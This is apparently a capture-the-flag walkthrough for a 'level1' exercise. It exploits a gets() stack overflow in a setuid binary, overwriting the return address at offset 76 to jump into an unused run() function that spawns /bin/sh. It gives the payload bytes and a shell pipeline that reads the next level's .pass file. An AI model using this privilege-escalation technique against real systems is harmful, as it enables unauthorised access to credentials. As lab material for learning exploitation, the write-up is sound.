level1 - walkthrough
====================

Target: /home/user/level1/level1   (setuid + setgid level2)
Goal:   read /home/user/level2/.pass

1. The bug
   main() reads input with gets() into a 64-byte stack buffer. gets() has no
   bound, so a long line overflows past the buffer, the saved EBP, and the
   saved return address.

     main():
       lea    0x10(%esp),%eax   ; buf
       call   gets@plt          ; unbounded read
       leave ; ret

   There is also an unused function run() at 0x08048444 that calls
   system("/bin/sh") -- a shell with level2's privileges. It is never called
   normally, but it is exactly what we want to jump to.

2. Offset to the saved return address
   Feed a cyclic pattern under gdb and read EIP at the crash:
     eip = 0x63413563 ("c5Ac")  ->  cyclic_find -> offset 76.

3. Payload  (Ressources/exploit.py)
     payload = b"A"*76 + p32(0x08048444)
   76 filler bytes, then run's address (\x44\x84\x04\x08, no 0x0a so gets keeps
   reading the whole line). When main() does `leave; ret`, it returns into run.

4. Run
     $ python3 Ressources/exploit.py
     $ (cat payload; printf '\n'; sleep 1; echo 'cat /home/user/level2/.pass') | ./level1
   run() calls system("/bin/sh"); the command after the 1s pause is left in the
   pipe for that shell to execute. (Interactive: replace the echo with `cat`.)

